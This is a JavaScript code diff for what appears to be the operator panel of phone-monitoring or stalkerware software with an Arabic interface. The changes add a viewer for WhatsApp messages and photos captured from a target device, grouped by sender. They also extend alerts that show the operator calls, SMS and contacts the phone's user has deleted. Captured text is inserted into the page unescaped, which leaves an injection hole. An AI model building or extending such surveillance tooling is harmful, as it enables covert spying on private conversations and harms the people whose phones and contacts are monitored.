@@ -76,7 +76,7 @@ function checkNewDeleted(deleted) {
     if (!deleted || deleted.length === 0) return;
     if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
         const d = deleted[0];
-        const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
+        const typeName = d.deleted_type === 'call_logs' ? '📞 مكالمة محذوفة' : d.deleted_type === 'sms' ? '💬 رسالة محذوفة' : d.deleted_type === 'contacts' ? '👤 جهة محذوفة' : '🗑️ عنصر محذوف';
         showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
         const badge = document.getElementById('deletedCount');
         if (badge) {
@@ -87,7 +87,6 @@ function checkNewDeleted(deleted) {
     lastDeletedCount = deleted.length;
 }
 
-// ✅ حذف الجهاز مع 5 محاولات إعادة تحميل
 async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -103,7 +102,6 @@ async function deleteDevice() {
             document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
             document.getElementById('deviceNameDisplay').className = 'device-name-display';
             
-            // ✅ 5 محاولات
             setTimeout(() => { loadDevices(); }, 500);
             setTimeout(() => { loadDevices(); }, 1500);
             setTimeout(() => { loadDevices(); }, 3000);
@@ -197,6 +195,7 @@ async function loadAllData() {
     await loadApps();
     await loadDeviceInfo();
     await loadDeleted();
+    await loadWhatsApp();
 }
 
 async function loadDeleted() {
@@ -212,6 +211,203 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
+// ✅ تحميل رسائل واتساب — محادثات مجمعة
+async function loadWhatsApp() {
+    try {
+        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const messages = await response.json();
+        
+        const div = document.getElementById('whatsappList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!messages || messages.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>';
+            return;
+        }
+        
+        const conversations = {};
+        messages.forEach(msg => {
+            const sender = msg.sender || 'غير معروف';
+            if (!conversations[sender]) conversations[sender] = [];
+            conversations[sender].push(msg);
+        });
+        
+        Object.keys(conversations).forEach(sender => {
+            const msgs = conversations[sender].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
+            const lastMsg = msgs[msgs.length - 1];
+            const imageCount = msgs.filter(m => m.image_data).length;
+            const displayName = findContactName(sender) || sender;
+            
+            const conversationDiv = document.createElement('div');
+            conversationDiv.className = 'conversation-item';
+            conversationDiv.style.cssText = 'display:flex;align-items:center;gap:15px;padding:15px;background:#111;border-radius:8px;margin-bottom:10px;cursor:pointer;border:1px solid #222;position:relative;';
+            
+            conversationDiv.innerHTML = `
+                <div style="font-size:40px;">${lastMsg.is_group ? '👥' : '💬'}</div>
+                <div style="flex:1;" onclick="openWhatsAppChat('${sender}')">
+                    <div style="color:#00ffcc;font-weight:bold;font-size:16px;">${displayName}</div>
+                    <div style="color:#aaa;font-size:13px;">${lastMsg.message_type === 'image' ? '📷 صورة' : lastMsg.message || ''}</div>
+                    <div style="color:#888;font-size:12px;">📅 ${formatWhatsAppDate(lastMsg.timestamp)}</div>
+                </div>
+                <div style="text-align:center;">
+                    <div style="background:#00ffcc;color:black;padding:5px 12px;border-radius:15px;font-size:13px;font-weight:bold;">${msgs.length}</div>
+                    ${imageCount > 0 ? `<div style="color:#ff9800;font-size:11px;margin-top:5px;">📷 ${imageCount}</div>` : ''}
+                </div>
+                <button onclick="event.stopPropagation();deleteWhatsAppChat('${sender}')" style="position:absolute;top:5px;left:5px;background:none;border:none;color:#ff3300;cursor:pointer;font-size:18px;" title="حذف الدردشة">🗑️</button>
+            `;
+            
+            div.appendChild(conversationDiv);
+        });
+        
+        const badge = document.getElementById('whatsappCount');
+        if (badge) badge.textContent = `(${messages.length})`;
+        
+    } catch (e) {}
+}
+
+// ✅ فتح محادثة واتساب — رسائل مستلمة فقط
+async function openWhatsAppChat(sender) {
+    try {
+        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const messages = await response.json();
+        
+        const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
+            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
+        
+        const chatWindow = document.createElement('div');
+        chatWindow.id = 'whatsappChatWindow';
+        chatWindow.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+        `;
+        
+        const displayName = findContactName(sender) || sender;
+        
+        chatWindow.innerHTML = `
+            <div style="background:#075E54;padding:15px 20px;display:flex;align-items:center;gap:15px;box-shadow:0 2px 10px rgba(0,0,0,0.5);">
+                <button onclick="closeWhatsAppChat()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;">⬅️</button>
+                <div style="flex:1;">
+                    <div style="color:white;font-weight:bold;font-size:18px;">${displayName}</div>
+                    <div style="color:#ccc;font-size:12px;">${sender}</div>
+                    <div style="color:#aaa;font-size:11px;">${senderMessages.length} رسالة مستلمة</div>
+                </div>
+                <button onclick="selectAllWhatsApp()" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;" title="تحديد الكل">☑️</button>
+                <button onclick="deleteSelectedWhatsApp()" style="background:none;border:none;color:#ff3300;font-size:20px;cursor:pointer;padding:5px 10px;" title="حذف المحدد">🗑️</button>
+            </div>
+            <div id="whatsappMessagesContainer" style="flex:1;overflow-y:auto;padding:20px;background:#0a0a0a;">
+                ${senderMessages.map((msg) => {
+                    return `
+                    <div class="wa-msg" data-timestamp="${msg.timestamp}" style="margin-bottom:12px;">
+                        <div style="display:flex;justify-content:flex-start;">
+                            <div style="max-width:70%;padding:12px 15px;border-radius:15px;background:#1e2a2a;margin-right:auto;border-bottom-left-radius:5px;position:relative;">
+                                <div style="color:#25D366;font-size:11px;font-weight:bold;margin-bottom:3px;">📥 ${displayName}</div>
+                                ${msg.image_data ? `
+                                    <img src="data:image/jpeg;base64,${msg.image_data}" onclick="window.open(this.src)" style="max-width:250px;border-radius:10px;cursor:pointer;display:block;margin-bottom:5px;">
+                                ` : ''}
+                                <div style="color:white;font-size:15px;">${msg.message_type === 'image' ? '📷' : msg.message_type === 'video' ? '🎬' : msg.message_type === 'audio' ? '🎵' : msg.message_type === 'document' ? '📄' : ''} ${msg.message || ''}</div>
+                                <div style="color:#aaa;font-size:11px;text-align:left;margin-top:3px;">${formatWhatsAppDate(msg.timestamp)}</div>
+                            </div>
+                        </div>
+                    </div>
+                    `;
+                }).join('')}
+            </div>
+        `;
+        
+        document.body.appendChild(chatWindow);
+        
+        const container = document.getElementById('whatsappMessagesContainer');
+        container.scrollTop = container.scrollHeight;
+        
+    } catch (e) {}
+}
+
+// ✅ إغلاق المحادثة
+function closeWhatsAppChat() {
+    const window = document.getElementById('whatsappChatWindow');
+    if (window) window.remove();
+}
+
+// ✅ تحديد الكل
+function selectAllWhatsApp() {
+    const msgs = document.querySelectorAll('.wa-msg');
+    msgs.forEach(msg => {
+        if (msg.classList.contains('selected')) {
+            msg.classList.remove('selected');
+            msg.style.opacity = '1';
+        } else {
+            msg.classList.add('selected');
+            msg.style.opacity = '0.5';
+        }
+    });
+}
+
+// ✅ حذف المحدد
+async function deleteSelectedWhatsApp() {
+    const selected = document.querySelectorAll('.wa-msg.selected');
+    if (selected.length === 0) {
+        alert('⚠️ حدد رسائل أولاً');
+        return;
+    }
+    
+    if (!confirm(`حذف ${selected.length} رسالة؟`)) return;
+    
+    const timestamps = [];
+    selected.forEach(msg => {
+        timestamps.push(msg.getAttribute('data-timestamp'));
+    });
+    
+    try {
+        const response = await fetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
+        const result = await response.json();
+        
+        if (result.success) {
+            closeWhatsAppChat();
+            loadWhatsApp();
+        }
+    } catch (e) {}
+}
+
+// ✅ حذف دردشة كاملة
+async function deleteWhatsAppChat(sender) {
+    if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
+    
+    try {
+        const response = await fetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
+        const result = await response.json();
+        
+        if (result.success) {
+            loadWhatsApp();
+        }
+    } catch (e) {}
+}
+
+// ✅ تنسيق التاريخ
+function formatWhatsAppDate(t) {
+    if (!t) return '—';
+    try {
+        const d = new Date(Number(t));
+        if (isNaN(d.getTime())) return '—';
+        return d.toLocaleString('ar', { 
+            year: 'numeric', 
+            month: '2-digit', 
+            day: '2-digit',
+            hour: '2-digit', 
+            minute: '2-digit',
+            second: '2-digit'
+        });
+    } catch (e) { return '—'; }
+}
+
 function displayDeleted() {
     const div = document.getElementById('deletedList');
     if (!div) return;
@@ -223,31 +419,58 @@ function displayDeleted() {
         return;
     }
     
-    [...allDeleted].sort((a, b) => (b.deleted_at || 0) - (a.deleted_at || 0)).forEach(item => {
+    [...allDeleted].sort((a, b) => (b.timestamp || b.deleted_at || 0) - (a.timestamp || a.deleted_at || 0)).forEach(item => {
         const divItem = document.createElement('div');
         divItem.className = 'conversation-item';
         
-        if (item.type === 'deleted_call') {
+        const deletedType = item.deleted_type || item.type || '';
+        const deletedCount = item.deleted_count || item.count || 1;
+        
+        if (deletedType === 'call_logs' || deletedType === 'deleted_call') {
             divItem.innerHTML = `
                 <div class="conversation-avatar">📞</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">مكالمة محذوفة</div>
+                    <div class="conversation-name">📞 مكالمة محذوفة</div>
+                    <div class="conversation-preview">عدد المكالمات المحذوفة: ${deletedCount}</div>
                     <div class="conversation-preview">الرقم: ${item.number || 'غير معروف'}</div>
-                    <div class="conversation-preview">النوع: ${getCallType(item.call_type)} | المدة: ${formatDuration(item.duration)}</div>
-                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
+                    <div class="conversation-preview">النوع: ${getCallType(item.call_type) || '—'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                 </div>
-                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
             `;
-        } else {
+        } else if (deletedType === 'sms' || deletedType === 'deleted_sms') {
             divItem.innerHTML = `
                 <div class="conversation-avatar">💬</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">رسالة محذوفة</div>
+                    <div class="conversation-name">💬 رسالة محذوفة</div>
+                    <div class="conversation-preview">عدد الرسائل المحذوفة: ${deletedCount}</div>
                     <div class="conversation-preview">المرسل: ${item.address || 'غير معروف'}</div>
-                    <div class="conversation-preview">النص: ${item.body || ''}</div>
-                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
+                    <div class="conversation-preview">النص: ${item.body || '—'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                 </div>
-                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
+            `;
+        } else if (deletedType === 'contacts' || deletedType === 'deleted_contact') {
+            divItem.innerHTML = `
+                <div class="conversation-avatar">👤</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">👤 جهة اتصال محذوفة</div>
+                    <div class="conversation-preview">عدد الجهات المحذوفة: ${deletedCount}</div>
+                    <div class="conversation-preview">الاسم: ${item.name || 'غير معروف'}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
+                </div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
+            `;
+        } else {
+            divItem.innerHTML = `
+                <div class="conversation-avatar">🗑️</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">🗑️ عنصر محذوف</div>
+                    <div class="conversation-preview">النوع: ${deletedType || 'غير معروف'}</div>
+                    <div class="conversation-preview">العدد: ${deletedCount}</div>
+                    <div class="conversation-preview">التاريخ: ${formatDate(item.timestamp || item.deleted_at)}</div>
+                </div>
+                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
             `;
         }
         
